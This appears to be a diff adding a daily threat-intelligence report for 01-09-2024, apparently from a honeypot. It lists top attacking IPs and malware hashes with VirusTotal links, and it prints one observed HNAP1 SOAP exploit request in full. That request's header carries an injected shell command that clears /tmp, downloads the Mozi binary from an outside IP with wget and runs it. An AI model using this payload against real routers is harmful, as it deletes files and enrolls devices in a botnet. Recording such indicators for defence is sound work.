@@ -1,0 +1,33 @@
+Top 5 IPs for 01-09-2024 :
+
+134.209.162.179
+43.153.220.12
+124.156.196.216
+200.69.236.207
+123.108.78.213
+
+
+Malware Observed:
+
+
+36b73a68dcc7c0b3992a3e5d945c279295ca5684e3f21d106dcd520d3e955e9a
+https://www.virustotal.com/gui/file/36b73a68dcc7c0b3992a3e5d945c279295ca5684e3f21d106dcd520d3e955e9a
+
+
+4265c4ac97a3b68ea47a4232e5ec0e192f32be7a4144af8c5233d54d4381a732
+https://www.virustotal.com/gui/file/4265c4ac97a3b68ea47a4232e5ec0e192f32be7a4144af8c5233d54d4381a732
+
+
+f9e927cfcf2c4994c2258f726bcd329c7b7f2cb6e9e22fb25de81e1d0f6a344c
+https://www.virustotal.com/gui/file/f9e927cfcf2c4994c2258f726bcd329c7b7f2cb6e9e22fb25de81e1d0f6a344c
+
+
+Commands/exploits observed
+
+POST /HNAP1/ HTTP/1.0
+Host: <Host IP>
+Content-Type: text/xml; charset="utf-8"
+SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://220.158.159.139:57588/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
+Content-Length: 640
+
+<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><AddPortMapping xmlns="http://purenetworks.com/HNAP1/"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMappingProtocol>TCP</PortMappingProtocol><ExternalPort>1234</ExternalPort><InternalPort>1234</InternalPort></AddPortMapping></soap:Body></soap:Envelope>
